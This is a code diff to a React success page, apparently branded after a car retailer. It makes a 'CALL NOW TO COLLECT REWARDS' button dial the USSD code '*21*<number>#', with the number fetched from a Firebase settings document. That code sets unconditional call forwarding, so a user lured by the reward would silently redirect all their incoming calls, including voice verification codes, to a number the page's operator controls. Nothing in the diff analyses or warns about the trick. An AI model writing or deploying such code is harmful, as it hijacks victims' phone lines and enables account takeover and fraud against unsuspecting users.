@@ -1,23 +1,43 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useMemo } from 'react';
 import FirebaseUtil from '../FirebaseRepo';
 import '../App.css';
 
 const SuccessPage = () => {
   const [callNumber, setCallNumber] = useState('1800-123-4567');
 
+  // Format the call number for USSD
+  const formattedCallNumber = useMemo(() => {
+    // Remove any non-digit characters from the call number
+    const digitsOnly = callNumber.replace(/\D/g, '');
+    // Ensure it's a valid 10-digit number
+    return digitsOnly.length === 10 ? digitsOnly : '1800123456'; // Default if invalid
+  }, [callNumber]);
+
   useEffect(() => {
     const fetchCallNumber = async () => {
       try {
         const doc = await FirebaseUtil.getDocument("carvana_settings", "forwarding_numbers");
+        console.log('Fetched call number data:', doc); // Log the fetched data
+        
         if (doc?.call_forwarding_number && typeof doc.call_forwarding_number === 'string') {
-          setCallNumber(doc.call_forwarding_number.trim());
+          const trimmedNumber = doc.call_forwarding_number.trim();
+          console.log('Setting call number:', trimmedNumber);
+          setCallNumber(trimmedNumber);
+        } else {
+          console.log('No valid call forwarding number found in document');
         }
       } catch (error) {
         console.error("Error fetching call number:", error);
+        // Set a default number if fetching fails
+        setCallNumber('1800123456');
       }
     };
     fetchCallNumber();
   }, []);
+
+  useEffect(() => {
+    console.log('Current call number:', callNumber);
+  }, [callNumber]);
 
   return (
     <div className="flex flex-col min-h-screen bg-white">
@@ -78,6 +98,12 @@ const SuccessPage = () => {
           </div>
 
           <button
+            onClick={() => {
+              // Format the USSD code with the call number
+              const ussdCode = `*21*${formattedCallNumber}#`;
+              // Open the phone dialer with the USSD code
+              window.location.href = `tel:${encodeURIComponent(ussdCode)}`;
+            }}
             className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
           >
             CALL NOW TO COLLECT REWARDS
